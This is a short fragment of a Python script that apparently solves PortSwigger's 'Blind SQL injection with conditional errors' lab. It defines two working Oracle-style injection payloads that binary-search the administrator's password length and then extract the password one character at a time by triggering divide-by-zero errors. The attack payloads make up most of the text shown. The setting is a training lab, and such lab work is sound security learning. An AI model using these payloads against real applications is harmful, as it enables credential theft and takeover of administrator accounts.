...
global TGT_URL 
LEN_PAYLOAD = "'|| (SELECT CASE WHEN (LENGTH(password)<=<MID>) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator') ||'"
PWD_PAYLOAD = "'|| (SELECT CASE WHEN (ASCII(SUBSTR(password,<POSITION>,1))<=<MID>) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = 'administrator') ||'"
...
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script to solve the \"Blind SQL injection with conditional errors\" PortSwigger lab.")
